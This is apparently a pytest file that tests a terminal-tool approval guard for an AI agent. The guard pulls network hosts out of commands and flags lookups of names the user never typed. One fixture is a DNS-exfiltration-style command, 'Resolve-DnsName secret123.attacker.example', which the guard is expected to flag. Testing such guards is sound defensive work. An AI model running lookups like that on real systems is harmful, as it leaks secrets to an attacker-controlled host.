from __future__ import annotations

import pytest

from core.command_targets import is_known_target, network_targets
from tools.terminal_tools import needs_approval


@pytest.mark.parametrize(
    ("command", "expected"),
    [
        ("ping 8.8.8.8 -n 2", ["8.8.8.8"]),
        ("Resolve-DnsName github.com", ["github.com"]),
        ("Test-NetConnection github.com -Port 443", ["github.com"]),
        ("Get-CimInstance Win32_OperatingSystem -ComputerName server1", ["server1"]),
        ("Get-Service -Comp server2", ["server2"]),
        ("systeminfo /S fileserver", ["fileserver"]),
        ("ipconfig /all", []),
        ("Get-Process | Sort-Object CPU", []),
    ],
)
def test_network_targets_finds_hosts(command: str, expected: list[str]) -> None:
    assert network_targets(command) == expected


@pytest.mark.parametrize(
    ("target", "typed", "known"),
    [
        ("8.8.8.8", "", True),
        ("::1", "", True),
        ("localhost", "", True),
        ("github.com", "can you ping github.com", True),
        ("GitHub.com", "ping github.com please", True),
        ("secret123.attacker.example", "is my internet working?", False),
    ],
)
def test_is_known_target(target: str, typed: str, known: bool) -> None:
    assert is_known_target(target, typed) is known


def test_needs_approval_for_a_lookup_of_a_name_the_user_never_typed() -> None:
    assert needs_approval({"command": "Resolve-DnsName secret123.attacker.example"}, "is my internet ok?")


def test_needs_approval_not_for_a_name_the_user_typed() -> None:
    assert not needs_approval({"command": "ping github.com -n 2"}, "ping github.com for me")


def test_needs_approval_not_for_a_literal_address() -> None:
    assert not needs_approval({"command": "ping 1.1.1.1"}, "is my internet working?")
